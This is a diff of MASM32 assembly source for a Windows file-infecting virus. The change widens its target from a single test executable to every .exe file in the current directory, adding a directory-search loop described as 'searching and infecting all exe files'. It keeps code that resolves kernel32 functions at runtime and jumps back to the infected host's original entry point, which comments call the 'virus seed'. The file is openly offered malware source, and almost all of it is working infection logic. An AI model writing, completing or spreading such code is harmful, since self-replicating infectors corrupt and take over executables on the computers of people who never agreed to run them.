@@ -6,6 +6,9 @@
 .model flat, stdcall
 option casemap:none
 
+include	\masm32\include\windows.inc
+include	\masm32\include\kernel32.inc
+
 .code
 
 begin_copy:
@@ -22,7 +25,7 @@ begin_copy:
     getProcAddress_name     db "GetProcAddress", 0
     loadLibrary_name        db "LoadLibraryA", 0
 
-	file_name				db ".\test.exe", 0
+	file_regex				db "*.exe", 0
 
 	dbg_sysfail				db "A system function failed", 0	; DEBUG
 	dbg_infectfail			db "Problem with an exe file", 0	; DEBUG
@@ -50,8 +53,8 @@ begin_copy:
 ; PROCEDURES
 ; ¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤
 
-include		utils.asm
-include		infect_file.asm
+include	utils.asm
+include	infect_file.asm
 
 ; ¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤
 ; PROCEDURES - END
@@ -80,7 +83,9 @@ main PROC NEAR
 	LOCAL	imageBase:DWORD
 	LOCAL	filehandle:DWORD
 	LOCAL	fileptr:DWORD
+	LOCAL	filesearchhandle:DWORD
 	LOCAL	filesize:DWORD
+	LOCAL	win32finddata:WIN32_FIND_DATA
 
 ; Function addresses
 	LOCAL	closehandle_addr:DWORD
@@ -98,7 +103,7 @@ main PROC NEAR
 include	search_k32.asm								; Search Kernel32.dll base address and resolves GetProcAddress and LoadLibraryA function addresses.
 
 ; Loads a function from a dll using GetProcAddress and LoadLibrary that we just got from kernel32.dll.
-; Can be used ONLY within this procedure.
+; Can be used ONLY within main procedure.
 LOADFUNC	MACRO	fct_name, dll_name, result_container
     lea     edx, [ebx + offset dll_name]		    ;
     push    edx                                     ;
@@ -111,7 +116,7 @@ LOADFUNC	MACRO	fct_name, dll_name, result_container
 ENDM
 
 ; Load your functions here.
-	
+
 	LOADFUNC	closehandle_name,	kernel32_dll_name,	closehandle_addr
 	LOADFUNC	createfile_name,	kernel32_dll_name,	createfile_addr
 	LOADFUNC	findclose_name,		kernel32_dll_name,	findclose_addr
@@ -137,8 +142,8 @@ ENDM
 
 include	search_files.asm							; Loop for searching and infecting all exe files in the directory.
 
-	mov		ecx, [ebx + oldEntryPoint]
-	leave
+	mov		ecx, [ebx + oldEntryPoint]	;
+	leave								; Epilogue. Because of the jmp, the epilogue of the current procedure will never be executed, therefore this one is here.
 	jmp		ecx							; Jump to currently executed infected file's original entry. If it is the virus seed, it is just a jump to end_copy.
 
     ret
